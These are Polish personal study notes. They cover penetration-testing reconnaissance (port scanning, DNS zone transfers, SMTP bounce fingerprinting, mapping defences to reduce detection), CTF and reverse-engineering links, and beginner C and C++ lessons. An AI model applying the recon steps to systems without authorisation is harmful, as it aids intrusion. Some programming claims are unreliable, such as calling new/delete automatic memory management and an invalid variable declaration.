NRO - http://www.nro.net
AFRINIC - http://www.afrinic.net
APNIC - http://www.apnic.net
ARIN - http://ws.arin.net
LACNIC - http://www.lacnic.net
RIPE - http://www.ripe.net
Po zapytaniu odpowiedniego rejestratora możemy uzyskać informacje o rejestrującym. Istnieje wiele witryn oferujących informacje WHOIS; jednak w celu zapewnienia dokładności dokumentacji należy korzystać tylko z odpowiedniego rejestratora.

InterNIC - http://www.internic.net/ http://www.internic.net ]
Zazwyczaj prosty whois przeciwko ARIN skieruje Cię do właściwego rejestratora.

Okulary BGP
Możliwe jest zidentyfikowanie numeru systemu autonomicznego (ASN) dla sieci uczestniczących w protokole Border Gateway Protocol (BGP). Ponieważ ścieżki tras BGP są reklamowane na całym świecie, możemy je znaleźć za pomocą zwierciadła BGP4 i BGP6.

BGP4 - http://www.bgp4.as/ Looking-glasses
BPG6 - http://lg.he.net/
Aktywny ślad
Skanowanie portów
Techniki skanowania portów będą się różnić w zależności od ilości czasu dostępnego na test i konieczności działania w ukryciu. Jeśli wiedza o systemach jest zerowa, do identyfikacji systemów można użyć szybkiego skanowania ping. Ponadto należy uruchomić szybkie skanowanie bez weryfikacji ping (-PN w nmap), aby wykryć najczęściej dostępne porty. Po zakończeniu można uruchomić bardziej kompleksowe skanowanie. Niektórzy testerzy sprawdzają tylko otwarte porty TCP, sprawdź również UDP. Dokument http://nmap.org/nmap_doc.html szczegółowo opisuje typy skanowania portów. Nmap („Network Mapper”) jest de facto standardem audytu/skanowania sieci. Nmap działa zarówno w systemie Linux, jak i Windows.

Więcej informacji na temat wykorzystania Nmap do tego celu można znaleźć w Wytycznych technicznych PTES

Nmap ma dziesiątki dostępnych opcji. Ponieważ ta sekcja dotyczy skanowania portów, skupimy się na poleceniach wymaganych do wykonania tego zadania. Należy zauważyć, że używane polecenia zależą głównie od czasu i liczby skanowanych hostów. Im więcej hostów lub mniej czasu masz na wykonanie tych zadań, tym mniej będziemy przesłuchiwać hosta. Stanie się to oczywiste, gdy będziemy kontynuować dyskusję na temat opcji.

Należy również przetestować protokół IPv6.

Łapanie sztandarów
Przechwytywanie banerów to technika wyliczania używana do zbierania informacji o systemach komputerowych w sieci i usługach obsługujących jej otwarte porty. Przechwytywanie banerów służy do identyfikowania w sieci wersji aplikacji i systemu operacyjnego, na którym działa docelowy host.

Przechwytywanie banerów jest zwykle wykonywane przy użyciu protokołów Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP) i Simple Mail Transfer Protocol (SMTP); odpowiednio porty 80, 21 i 25. Narzędzia powszechnie używane do przechwytywania banerów to Telnet, nmap i Netcat.

Przeszukiwanie SNMP
Wykonywane są również przeszukiwania SNMP, ponieważ oferują one mnóstwo informacji o konkretnym systemie. Protokół SNMP jest protokołem bezstanowym zorientowanym na datagramy. Niestety serwery SNMP nie odpowiadają na żądania z nieprawidłowymi ciągami społecznościowymi, a leżący u ich podstaw protokół UDP nie zgłasza niezawodnie zamkniętych portów UDP. Oznacza to, że „brak odpowiedzi” z sondowanego adresu IP może oznaczać jedną z następujących sytuacji:

maszyna nieosiągalna
Serwer SNMP nie działa
nieprawidłowy ciąg społeczności
datagram odpowiedzi jeszcze nie dotarł
Transfery strefowe
Transfer strefy DNS, znany również jako AXFR, to rodzaj transakcji DNS. Jest to mechanizm zaprojektowany do replikacji baz danych zawierających dane DNS w zestawie serwerów DNS. Transfer strefowy jest dostępny w dwóch wersjach: pełnej (AXFR) i przyrostowej (IXFR). Dostępnych jest wiele narzędzi do testowania możliwości wykonania transferu strefy DNS. Narzędzia powszechnie używane do wykonywania transferów stref to host, dig i nmap.

Odbicie SMTP
Odesłanie SMTP, zwane także raportem/potwierdzeniem niedostarczenia (NDR), (nieudanym) powiadomieniem o statusie doręczenia (DSN), powiadomieniem o niedostarczeniu (NDN) lub po prostu odbiciem, to automatyczna wiadomość e-mail od system pocztowy informujący nadawcę kolejnej wiadomości o problemie z dostarczeniem. Może to pomóc atakującemu w uzyskaniu odcisku palca serwera SMTP, ponieważ informacje o serwerze SMTP, w tym oprogramowanie i wersje, mogą być zawarte w odesłanej wiadomości.

Można to zrobić, po prostu tworząc fałszywy adres w domenie celu. Na przykład asDFADSF_garbage_address@target.com może zostać użyty do przetestowania target.com. Gmail zapewnia pełny dostęp do nagłówków, dzięki czemu jest łatwym wyborem dla testerów.

Wykrywanie DNS
Wykrywanie DNS można przeprowadzić, przeglądając rekordy WHOIS dla autorytatywnego serwera nazw domeny. Dodatkowo należy sprawdzić wariacje nazwy domeny głównej, a także sprawdzić witrynę pod kątem odniesień do innych domen, które mogą znajdować się pod kontrolą celu.

DNS do przodu/do tyłu
Odwrotnego DNS można użyć do uzyskania prawidłowych nazw serwerów używanych w organizacji. Istnieje zastrzeżenie, że musi mieć rekord PTR (odwrotny) DNS, aby mógł rozpoznać nazwę z podanego adresu IP. Jeśli zostanie rozwiązany, wyniki zostaną zwrócone. Zwykle odbywa się to poprzez przetestowanie serwera z różnymi adresami IP, aby sprawdzić, czy zwraca jakieś wyniki.

Bruteforce DNS
Po zidentyfikowaniu wszystkich informacji związanych z domenami klienta nadszedł czas, aby rozpocząć wysyłanie zapytań do DNS. Ponieważ DNS jest używany do mapowania adresów IP na nazwy hostów i odwrotnie, będziemy chcieli sprawdzić, czy jest niepewnie skonfigurowany. Będziemy dążyć do wykorzystania DNS w celu ujawnienia dodatkowych informacji o kliencie. Jedną z najpoważniejszych błędnych konfiguracji związanych z DNS jest umożliwienie użytkownikom Internetu wykonania transferu strefy DNS. Istnieje kilka narzędzi, których możemy użyć do wyliczenia DNS, aby nie tylko sprawdzić możliwość wykonywania transferów stref, ale także potencjalnie wykryć dodatkowe nazwy hostów, które nie są powszechnie znane.

Wykrywanie aplikacji internetowych
Identyfikacja słabych aplikacji internetowych może być szczególnie owocnym zajęciem podczas testu penetracyjnego. Rzeczy, których należy szukać, obejmują aplikacje OTS, które zostały źle skonfigurowane, aplikacje OTS, które mają funkcjonalność wtyczek (wtyczki często zawierają bardziej podatny na ataki kod niż aplikacja podstawowa) oraz aplikacje niestandardowe. Odciski palców aplikacji internetowych, takie jak WAFP, mogą być tutaj używane z doskonałym skutkiem.

Wykrywanie i wyliczanie wirtualnych hostów
Serwery internetowe często obsługują wiele „wirtualnych” hostów w celu skonsolidowania funkcjonalności na jednym serwerze. Jeśli wiele serwerów wskazuje ten sam adres DNS, mogą one być hostowane na tym samym serwerze. Narzędzia, takie jak wyszukiwanie MSN, mogą być używane do mapowania adresu IP na zestaw hostów wirtualnych.

Stwórz zewnętrzną listę docelową
Po wykonaniu powyższych czynności należy sporządzić listę użytkowników, adresów e-mail, domen, aplikacji, hostów i usług.

Wersje mapowania
Sprawdzanie wersji to szybki sposób identyfikowania informacji o aplikacji. Do pewnego stopnia wersje usług można pobrać za pomocą nmap, a wersje aplikacji internetowych można często zebrać, patrząc na źródło dowolnej strony.

Identyfikacja poziomów poprawek
Aby wewnętrznie zidentyfikować poziom poprawek usług, rozważ użycie oprogramowania, które będzie badać system pod kątem różnic między wersjami. Poświadczenia mogą być używane w tej fazie testu penetracyjnego, pod warunkiem, że klient wyraził na to zgodę. Skanery luk w zabezpieczeniach są szczególnie skuteczne w zdalnym identyfikowaniu poziomów poprawek bez poświadczeń.

Szukam słabych aplikacji internetowych
Identyfikacja słabych aplikacji internetowych może być szczególnie owocnym zajęciem podczas testu penetracyjnego. Rzeczy, których należy szukać, obejmują aplikacje OTS, które zostały źle skonfigurowane, aplikacje OTS, które mają funkcjonalność wtyczek (wtyczki często zawierają bardziej podatny na ataki kod niż aplikacja podstawowa) oraz aplikacje niestandardowe. Odciski palców aplikacji internetowych, takie jak WAFP, mogą być tutaj używane z doskonałym skutkiem.


Zidentyfikuj próg blokady
Zidentyfikowanie progu blokady usługi uwierzytelniania pozwoli upewnić się, że ataki bruteforce nie blokują celowo ważnych użytkowników podczas testowania. Zidentyfikuj wszystkie różne usługi uwierzytelniania w środowisku i przetestuj pojedyncze, nieszkodliwe konto pod kątem blokady. Często wystarczy 5 - 10 prób prawidłowego konta, aby ustalić, czy usługa zablokuje użytkowników.

Ślad wewnętrzny
Rekonesans pasywny
Jeśli tester ma dostęp do sieci wewnętrznej, wąchanie pakietów może dostarczyć wielu informacji. Użyj technik, takich jak te zaimplementowane w p0f, aby zidentyfikować systemy.

Zidentyfikuj wewnętrzne zakresy klientów
Podczas przeprowadzania testów wewnętrznych najpierw wylicz swoją lokalną podsieć, a następnie często możesz ekstrapolować stamtąd do innych podsieci, nieznacznie modyfikując adres. Spojrzenie na tablicę routingu hosta wewnętrznego może być szczególnie wymowne. Poniżej znajduje się kilka technik, które można zastosować.

Serwery DHCP mogą być potencjalnym źródłem nie tylko informacji lokalnych, ale także zdalnych zakresów adresów IP i szczegółów ważnych hostów. Większość serwerów DHCP zapewnia lokalny adres bramy IP, a także adresy serwerów DNS i WINS. W sieciach opartych na systemie Windows serwery DNS są zazwyczaj kontrolerami domeny usługi Active Directory, a zatem obiektami zainteresowania.

Aktywny rozpoznanie
Wewnętrzny rekonesans aktywny powinien zawierać wszystkie elementy zewnętrznego, a dodatkowo powinien koncentrować się na funkcjonalnościach intranetowych takich jak:

Usługi katalogowe (Active Directory, Novell, Sun itp.)
Witryny intranetowe zapewniające funkcjonalność biznesową
Aplikacje korporacyjne (ERP, CRM, Księgowość itp.)
Identyfikacja wrażliwych segmentów sieci (księgowość, R&D, marketing itp.)
Mapowanie dostępu do sieci produkcyjnych (centra danych)
Infrastruktura VoIP
Udostępnianie uwierzytelniania (kerberos, tokeny plików cookie itp.)
Zarządzanie serwerem proxy i dostępem do Internetu

Zidentyfikuj mechanizmy ochrony
Należy zidentyfikować i zmapować następujące elementy zgodnie z odpowiednią lokalizacją/grupą/osobami objętymi zakresem. Umożliwi to prawidłowe zastosowanie badań i wykorzystania luk w zabezpieczeniach podczas przeprowadzania rzeczywistego ataku - maksymalizując w ten sposób skuteczność ataku i minimalizując współczynnik wykrywalności.

Zabezpieczenia oparte na sieci
„Proste” filtry pakietów
Urządzenia kształtujące ruch
Systemy DLP
Szyfrowanie/tunelowanie

Zabezpieczenia oparte na hoście
Zabezpieczenia stosu/sterty
Biała lista aplikacji
AV/filtrowanie/analiza behawioralna
Systemy DLP

Zabezpieczenia na poziomie aplikacji
Zidentyfikuj zabezpieczenia aplikacji
Opcje kodowania
Potencjalne obwodnice
Strony z białej listy

Zabezpieczenia pamięci masowej
HBA — poziom hosta
Maskowanie LUN
Kontroler pamięci masowej
Sekret iSCSI CHAP

Ochrona użytkownika
Oprogramowanie do filtrowania AV/spamu
Konfiguracja SW, która ogranicza możliwości wykorzystania, może być uznana za antyspamową/antyAV
----------------------------------------------------------


**Zestaw narzędzi
Przyznaję, że nie używam wielu narzędzi, przez większość czasu piszę szybki skrypt PHP/Python. Powinienem, dzięki temu moje sesje byłyby bardziej wydajne, ale to są te podstawowe, z których korzystam cały czas.

Należy zauważyć, że automatyczne skanery (takie jak Acunetix lub Nikto) generują dużo hałasu. Większość programów zabrania ich używania z tego powodu. Poza tym jest bardzo mało prawdopodobne, że za pomocą takiego skanera znajdziesz coś, czego nikt inny nie znalazł.

Burp Suite — przechwytujący serwer proxy, który umożliwia modyfikowanie żądań w locie, powtarzanie żądań i tak dalej.
Nmap - Przydatny do wyszukiwania dodatkowych serwerów WWW do zbadania (pod warunkiem, że zakres programu jest wystarczająco szeroki)
Wykrywanie DNS — znajdź dodatkowe subdomeny do zbadania**


Na czym polega wykrywanie exploitów 0-day?

O. Czasem znalezienie luk w zabezpieczeniach jest łatwe, czasem wymaga to dużo więcej pracy. To zawsze zależy od tego, czego szukasz. Znalezienie luki w zabezpieczeniach takiej jak Cross Site Scripting (XSS) w witrynie internetowej i exploitów dla niej jest niezwykle łatwe i nie wymaga automatycznych narzędzi; możesz to zrobić ręcznie.

P. Jak zdobywasz informacje? Czy zaczyna się od podpowiedzi, czy to tylko kwestia pogłębiania kodu w poszukiwaniu dziur?

O. Czasami po prostu wpadamy na pomysł i testujemy go, ale innym razem czytamy fora hakerów, aby dowiedzieć się, czego szukają nasi koledzy i jakie nowe exploity są opracowywane i wprowadzane na rynek. Dlatego tak ważne jest odpowiedzialne ujawnianie informacji. Jeśli miałbym opublikować na forum hakerskim informację o luce, którą odkryłem w konkretnej witrynie, cała grupa hakerów zacznie przeglądać tę witrynę i znajdować inne luki. To jak polowanie na trofea. Ważne jest, aby dać odpowiedniej firmie możliwość załatania wszelkich luk w zabezpieczeniach przed ujawnieniem wyników badań.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Programowanie

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
strony do nauki:
https://www.theodinproject.com/
https://www.sololearn.com/
https://www.freecodecamp.org/news/how-to-automatically-generate-code-snippets-visual-studio/
https://exercism.org/
https://codeacademy.com
https://upskillcourses.com/
https://www.w3schools.com/
https://docs.python.org/3/tutorial/index.html /API
https://github.com/rasbt/python-machine-learning-book-2nd-edition
https://github.com/rasbt/python-machine-learning-book
https://www.liaoxuefeng.com/wiki/1016959663602400/1016959735620448
https://app.datacamp.com/
https://docs.python.org/3.12/contents.html
https://www.learnpython.org/en/Variables_and_Types
https://studio.code.org/courses
https://code.org/learn

https://www.flaticon.com/
https://coolors.co/

 
typy danych w językach programowania można podzielić na:**

statycznie typowane
Są to języki, w których typy są nadawane podczas kompilacji. Wiele tego typu języków programowania wymaga deklarowania wszystkich zmiennych przed ich użyciem, przez podanie ich typu. Przykładami takich języków są Java, C/C++, Pascal.
dynamicznie typowane
Są to języki, w których typy zmiennych są nadawane podczas działania programu. VBScript i Python są językami dynamicznie typowanymi, ponieważ nadają one typ zmiennej podczas przypisania do niej wartości.
silnie typowane
Są to języki, w których między różnymi typami widać wyraźną granicę. Jeśli mamy pewną liczbę całkowitą, to nie możemy jej traktować jak łańcuch znaków bez wcześniejszej konwersji.
słabo typowane
Są to języki, w których możemy nie zwracać uwagi na typ zmiennej. Do takich języków zaliczymy VBScript. Możemy w nim, nie wykonując żadnej wyraźnej konwersji, połączyć łańcuch znaków '12' z liczbą całkowitą 3 otrzymując łańcuch '123', a następnie potraktować go jako liczbę całkowitą 123. Konwersja jest wykonywana automatycznie.
Python jest językiem zarówno dynamicznie typowanym (ponieważ nie wymaga wyraźnej deklaracji typu), jak i silnie typowanym (ponieważ zmienne posiadają wyraźnie ustalone typy, które nie podlegają automatycznej konwersji).


dobry kompresor --> https://gifcompressor.com/ 

https://replit.com/

**Programy są jak wskazówki: są to szczegółowe instrukcje krok po kroku.**

Często do tego samego celu można dotrzeć na kilka sposobów.
Podobnie, podczas pisania programów zwykle istnieje kilka sposobów wykonania tego samego zadania.

Programy muszą być precyzyjne, aby wykonać zamierzone zadanie, podobnie jak wskazówki.

Programy są wykonywane krok po kroku. Jeśli czegoś brakuje, program nie będzie działał tak, jak chcesz.


 ## DLL
Biblioteki dynamiczne
Biblioteka dołączana dynamicznie (DLL) to biblioteka ładowana niezależnie od programu, który z niej korzysta. Zaletą bibliotek DLL jest to, że można załadować jedną bibliotekę DLL do pamięci i może z niej korzystać wiele programów. Zmniejsza to rozmiar programów.

Biblioteki statyczne
Biblioteka statyczna jest połączona bezpośrednio z/z programem, który z niej korzysta. Biblioteka, która jest połączona statycznie, nie może być używana przez wiele programów jednocześnie. Biblioteka jest częścią programu, w którym jest używana. Dzięki temu program jest większy z powodu dodatkowego kodu.

Import kontra eksport
Importuj — coś przywiezione z zewnętrznego źródła. Aby użyć funkcji z biblioteki, importujesz tę funkcję z biblioteki.
Eksportuj — coś wystawionego na zewnątrz, aby inne źródła mogły to zaimportować. Możesz uzyskać dostęp do funkcji z biblioteki DLL, ponieważ biblioteka DLL wyeksportowała tę funkcję. Ponieważ jest wyeksportowany, Twój program może go zaimportować.


https://betterprogramming.pub/

ciekawe - https://microbit.org/code/
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# C++

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
https://learn.microsoft.com/pl-pl/cpp/cpp/welcome-back-to-cpp-modern-cpp?view=msvc-170

https://github.com/changkun/modern-cpp-tutorial

Preprocesory to programy przetwarzające kod źródłowy przed kompilacją.
![0997390684a722d1a6dff04ee323a226.png](:/4276da7ebddf46afb34d6655442a48b3)
Etapy pośrednie można zobaczyć na powyższym schemacie. Kod źródłowy napisany przez programistów jest najpierw przechowywany w pliku, niech nazwa będzie „ program.c ”. Plik ten jest następnie przetwarzany przez preprocesory i generowany jest rozszerzony plik kodu źródłowego o nazwie „program.i”. Ten rozwinięty plik jest kompilowany przez kompilator i generowany jest plik kodu wynikowego o nazwie „program.obj”. Na koniec linker łączy ten plik kodu obiektowego z kodem obiektowym funkcji bibliotecznych w celu wygenerowania pliku wykonywalnego „program.exe”. 

![853184c749646d161b1c1cce59feedc2.png](:/a18db5386e144ef0a0199d62a13ba4d7)
więcej informacji - https://www.geeksforgeeks.org/cc-preprocessors/

**Ważne punkty**
Zawsze dołączaj niezbędne pliki nagłówkowe, aby zapewnić płynne wykonanie funkcji. Na przykład należy uwzględnić <iostream> , aby użyć std::cin i std::cout .
Wykonywanie kodu rozpoczyna się od funkcji main() .
Dobrą praktyką jest używanie w programach wcięć i komentarzy w celu ułatwienia zrozumienia.
cout służy do drukowania instrukcji, a cin służy do pobierania danych wejściowych.

![3f344f6b0ba495c4a851f12f1854f459.png](:/80e9f20c821e496d8fac9b1003a990ef)

**Optymalizacja wydajności**:

Optymalizacja wydajności to proces poprawiający wydajność programów C++.
Istnieje wiele technik, które można zastosować do optymalizacji kodu C++, takich jak:
Stosowanie wydajnych algorytmów
Unikanie niepotrzebnej alokacji pamięci
Korzystanie z optymalizacji kompilatora

C++ ma dwa sposoby zarządzania pamięcią: ręczny i automatyczny.

W przypadku ręcznego zarządzania pamięcią programista jest odpowiedzialny za jawne przydzielanie i zwalnianie pamięci. Można to zrobić za pomocą funkcji malloc()i free().
W przypadku automatycznego zarządzania pamięcią kompilator jest odpowiedzialny za automatyczne przydzielanie i zwalnianie pamięci. Odbywa się to za pomocą operatorów newi delete.
Automatyczne zarządzanie pamięcią jest preferowanym sposobem obsługi pamięci w C++. Jest bardziej wydajny i zapobiega wyciekom pamięci. Jednak debugowanie może być trudniejsze.

zawansowany C++ - https://www.incredibuild.com/blog/cpp-advanced-topics-for-experienced-cpp-devs

nauka:       
           https://cplusplus.com/doc/tutorial/exceptions/
           https://google.github.io/styleguide/cppguide.html
           https://ieeexplore.ieee.org/abstract/document/9576064
           https://www.geeksforgeeks.org/learning-art-competitive-programming/
           https://www.geeksforgeeks.org/introduction-to-c-programming-language/?ref=lbp
      
          https://isocpp.org/std/status
          https://en.wikipedia.org/wiki/C++
          https://www.codecademy.com/learn/learn-c-plus-plus
          https://academichelp.net/blog/coding-tips/c-for-beginners-best-learning-resources.html
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# inżynieria wsteczna

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
- strace nazwa pliku
- ltrace nazwa pliku
- objdump -d nazwa pliku
- file nazwa pliku
- gdb nazwa pliku
- ghidra
- https://youtu.be/oTD_ki86c9I


Czasami musisz najpierw odszyfrować/zwirtualizować plik exe. Następnie użyj Ghidry lub czegokolwiek.

ciekawy artykuł --> https://miltonamcs-private-organization.gitbook.io/analysing-a-malicious-github-repository/

 ciekawy opis + analiza kodu C w celu nauki: https://github.com/taviso/ctftool
 
 lista plików do obejścia zabezpieczeń źle skonfigurowanych systemów w unix - https://gtfobins.github.io/
 
 https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/
 
 https://crackmes.one/
 http://pwnable.kr/
 
 narzędzie - gdb-pwndbg
 
 pdfextractor filename

strings file -d


https://ctf101.org/binary-exploitation/overview/
https://trailofbits.github.io/ctf/exploits/
https://github.com/0xZ0F/Z0FCourse_ReverseEngineering

https://github.com/0xZ0F/Z0FCourse_ReverseEngineering/blob/master/Chapter%206%20-%20DLL/6.03%20Exports.md

rozpakowanie pliku .7z komenda: `7z x myarchive.7z`
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# C

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
kompilacja programu na kali linxie --> gcc -m64 hello.c -o hello
(hello.c to nazwa programu)

------------------------------------------------------------------------
|_|_|_|_|w3schools.com|_|_|_|_|
------------------------------------------------------
#include <stdio.h> to biblioteka plików nagłówkowych , która pozwala nam pracować z funkcjami wejścia i wyjścia, takimi jak printf(). Pliki nagłówkowe dodają funkcjonalność do programów C. (Czyli coś jak import w pythonie)

main(). Nazywa się to funkcją . Każdy kod w nawiasach klamrowych {}zostanie wykonany.

printf działą tak samo jak print w pythonie czyli 'drukuje' wynik np. printf("Witaj!");

Każda instrukcja C kończy się średnikiem ;

Linia 5: return 0 kończy main()funkcję.

A to wszystko dotyczy kodu "Hello World" czyli:

```
#include <stdio.h>

int main() {
printf("Hello World");
return 0;
}
```

Można użyć printf wielokronie np: 
                printf("hello world");
				printf("Test nastepny");				
Ale wtedy wydrukuje sięwszystko w jednej lini więc na końcu trzeba dodać \n np:
               
```
printf("hello world\n");
			   printf("Test Nastepny\n");
```


Wtedy kazdy komunikat pojawi się w nowej lini.

a \n\n zrobi jedną pustą linie  np. 

`printf("hello world\n\n");`

Znak nowej linii ( \n) nazywany jest sekwencją wyjściową i zmusza kursor do zmiany pozycji na początek następnej linii na ekranie. W rezultacie powstaje nowa linia.

Przykłady innych prawidłowych sekwencji specjalnych to: 
\t <-- to po prostu spacja w jedenj lini
\\ <-- to dodaje znak \ do słowa
\" to dodaje znak " między dwoma słowami np.
tak wygląda wynik: hello"other

komentarze:
w jednym wierszy --> //
w wielu wierszach początek /*  koniec */


**W C istnieją różne typy zmiennych (definiowane za pomocą różnych słów kluczowych), na przykład:**

int -  przechowuje liczby całkowite (liczby całkowite), bez miejsc po przecinku, takie jak 123lub-123

float -  przechowuje liczby zmiennoprzecinkowe, z miejscami dziesiętnymi, takimi jak 19.99lub-19.99

char -  przechowuje pojedyncze znaki, takie jak 'a'lub 'B'. Wartości char są ujęte w pojedyncze cudzysłowy

Deklarowanie (tworzenie zmienny):
trzeba określić typ i wartość np.

float myNum = 20.99;
wytłumaczenie: float to typ zmiennej, myNum to nazwa wartości (jak x lub myname) znak równości przypisuje wartość w tym przypadku to 20.99

Możesz także zadeklarować zmienną bez przypisywania wartości i przypisać wartość później:

```
// deklaracja zmiennej
int = myNum;

// przypisanie wartości do zmiennej
myNum = 15;
```

Normalnie w takim języku jak python wystareczyło by użycie print aby wudrukować wynik w zmiennej czyli: 
int myNum = 15;
print(myNum)

Ale nie w C, tutaj jest coś takiego jak  **specyfikator formatu**

Specyfikatory formatu są używane razem z printf() funkcją, aby powiedzieć kompilatorowi, jaki typ danych przechowuje zmienna. Zasadniczo jest to symbol zastępczy dla wartości zmiennej.

Specyfikator formatu zaczyna się od znaku procentu %, po którym następuje znak.

Na przykład, aby wypisać wartość zmiennej int, musisz użyć specyfikatora formatu %dlub %i otoczonego podwójnymi cudzysłowami wewnątrz printf()funkcji:

int main(){
int myNum = 15;
printf("%d", myNum); //Wynik będzie 15
return 0;
}
z czego %c jest do char a %f do float, %lf do double, %s do strings 


Aby wydrukować inne typy, użyj %cdla chari %fdla float:
```
#include <stdio.h>

int main(){
int myNum = 20;
float myFloatNum = 15.66;
char myLatter = 'B';

printf("%i\n", myNum);
printf("%f\n", myFloatNum);
printf("%c\n", myLatter);
return 0;
}
```

Aby połączyć zarówno tekst, jak i zmienną, oddziel je przecinkiem wewnątrz printf()funkcji:

```
#include <stdio.h>

int main(){
int myNum = 15;
printf("Pokaż liczbe: %d", myNum);
return 0;
}
```


Aby drukować różne typy w jednej printf()funkcji, możesz użyć następujących opcji:

```
#include <stdio.h>

int main(){
  int myNum = 20;
  char myLatter = 'A';
  printf("Moja ulubiona liczba to %i a Litera to %c", myNum, myLatter);
  return 0;
}
```

Możesz także przypisać wartość jednej zmiennej do drugiej:

```
#include <stdio.h>

int main(){
int myNum = 15;
int myOtherNum = 30;

myNum = myOtherNum;

printf("%i", myNum);
return 0;
}
```

Aby dodać zmienną do innej zmiennej, możesz użyć + operatora:

#include <stdio.h>

```
int main(){
int x = 50;
int y = 21;

int sum = x + y;
printf("%i", sum);
return 0;
}
```



dodawanie kilku  do hedenj wartości
#include <stdio.h>

```
int main(){
int x = 50, y = 20, z = 34;

printf("%i", x + y + z);
return 0;
}
```

lub:
```
#include <stdio.h>

int main(){
int x = 50, y = 20, z = 34;
int sum = x + y + z;

printf("%i", sum);
return 0;
}
```
(to to samo ale zapisane w inny sposób)

C Nazwy zmiennych
Wszystkie zmienne C muszą być identyfikowane za pomocą unikalnych nazw
Te unikalne nazwy są nazywane identyfikatorami .

Identyfikatorami mogą być nazwy krótkie (takie jak x i y) lub bardziej opisowe (wiek, suma, totalVolume).

czyli np.

int age = 22;
jest bardziej zrozumiałe niż
int a = 22;

Ogólne zasady nazewnictwa zmiennych to:

1. Nazwy mogą zawierać litery, cyfry i podkreślenia
2. Nazwy muszą zaczynać się od litery lub znaku podkreślenia (_)
3. W nazwach rozróżniana jest wielkość liter ( myVari myvarsą to różne zmienne)
4. Nazwy nie mogą zawierać spacji ani znaków specjalnych, takich jak !, #, % itp.
5. Zarezerwowane słowa (takie jak int) nie mogą być używane jako nazwy.

## Przykład z życia wzięty
Często w naszych przykładach upraszczamy nazwy zmiennych, aby pasowały do ich typu danych (myInt lub myNum dla inttypów, myChar dla chartypów itp.). Odbywa się to w celu uniknięcia zamieszania.

Jeśli jednak szukasz przykładu z życia wziętego, jak można wykorzystać zmienne, spójrz na poniższy program, w którym stworzyliśmy program przechowujący różne dane studenta:

#include <stdio.h>

```
int main() {

   int studentID = 77;
   int studentAGE = 19;
   int studentCLASS = 3;
   char studentSUM = 'A';
   
   printf(" Student ID %i\n\n", studentID);
   printf(" Student Age %i\n\n", studentAGE);
   printf(" Student Class %i\n\n", studentCLASS);
   printf(" Student general rating is %c\n\n", studentSUM);
   return 0;
}
```

**int** |2 lub 4 bajty| Przechowuje liczby całkowite, bez części dziesiętnych

**float** |4 bajty| Przechowuje liczby ułamkowe zawierające jedną lub więcej cyfr dziesiętnych. Wystarczający do przechowywania 6-7 cyfr dziesiętnych

**double** |8 bajtów| Przechowuje liczby ułamkowe zawierające jedną lub więcej cyfr dziesiętnych. Wystarczający do przechowywania 15 cyfr dziesiętnych

**char** |1 bajt| Przechowuje pojedynczy znak/literę/cyfrę lub wartości ASCII

**strings**(%s) to pewnie do całych słów typu 'car'

przykład z double; 

```
#include <stdio.h>

int main() {
float myFloatNum = 1.99;
double mydoubleNum = 39.55;

printf("%f\n", myFloatNum);
printf("%lf", mydoubleNum);
   return 0;
}
```

Jeśli chcesz usunąć dodatkowe zera (ustawić dokładność dziesiętną), możesz użyć kropki ( .), po której następuje liczba określająca, ile cyfr ma być wyświetlanych po przecinku:

```
#include <stdio.h>

int main(){
   float myfloatNum = 9.5;
   
   printf("%f\n", myfloatNum); // Pokaże normalny wynik (czyli 9.500000)
   printf("%.1f\n", myfloatNum); // pokaze 1 liczbe po przecinku (czyli 9.5)
   printf("%.2f\n", myfloatNum); // to samo co powyzej tylko 2 (czyli 9.50)
   printf("%.4f\n", myfloatNum); // to samo
   return 0;
}
```

## Konwersja typów
Czasami trzeba przekonwertować wartość jednego typu danych na inny typ. Jest to znane jako konwersja typu .

Na przykład, jeśli spróbujesz podzielić dwie liczby całkowite 5przez 2, spodziewasz się, że wynikiem będzie 2.5. Ale ponieważ pracujemy z liczbami całkowitymi (a nie zmiennoprzecinkowymi), poniższy przykład po prostu wyświetli 2:

```
#include <stdio.h>

int main(){
  int x = 5;
  int y = 2;
   int sum = 5 / 2;
 printf("%i", sum);
 return 0;
}
```


Istnieją dwa rodzaje konwersji w C:

**Niejawna konwersja** (automatycznie)
**Jawna konwersja** (ręcznie)

przykładowy kod:

```
int myint = 9.99;
printf("%d", myint); // Wynik będzie 9
```

co się stało .99? Możemy chcieć tych danych w naszym programie! Więc uważaj. Ważne jest, aby wiedzieć, jak kompilator działa w takich sytuacjach, aby uniknąć nieoczekiwanych wyników.

Jako inny przykład, jeśli podzielisz dwie liczby całkowite: 5przez 2, wiesz, że suma wynosi 2.5. A jak wiesz z początku tej strony, jeśli zapiszesz sumę jako liczbę całkowitą, wynik wyświetli tylko liczbę 2. Dlatego lepiej byłoby zapisać sumę jako a floatlub a double, prawda?

```
float sum = 5 / 2;
printf("%f", sum); // wynik to 2.00000
```

Dlaczego jest wynik, 2.00000a nie 2.5? Cóż, to dlatego, że 5 i 2 są nadal liczbami całkowitymi w dzieleniu. W takim przypadku należy ręcznie przekonwertować wartości całkowite na wartości zmiennoprzecinkowe. (patrz poniżej).

**Jawna Konwersja:**

```
#include <stdio.h>

int main(){
float sum = (float) 5 / 2;
printf("%.1f", sum); // Wynik to 2.5
return 0;
}
```

## Stałe
Jeśli nie chcesz, aby inni (lub ty) zmieniali istniejące wartości zmiennych, możesz użyć słowa constkluczowego.

Spowoduje to zadeklarowanie zmiennej jako „stałej”, co oznacza niezmienną i tylko do odczytu :

const int myNum = 15;  // Teraz cały czas będzie liczba 15
myNum = 10; // To bedzie error bo stała liczba to 15

Powinieneś zawsze deklarować zmienną jako stałą, gdy masz wartości, które prawdopodobnie się nie zmienią czyli np 1 minuta ma 60 sekund, a PI to 3.14 np:

```
#include <stdio.h>

int main(){
const int secoundsinminute = 60;
const float PI = 3.14;

printf("%i\n", secoundsinminute);
printf("%f", PI);
return 0;
}
```

Uwagi dotyczące stałych
Kiedy deklarujesz stałą zmienną, musisz jej przypisać wartość:
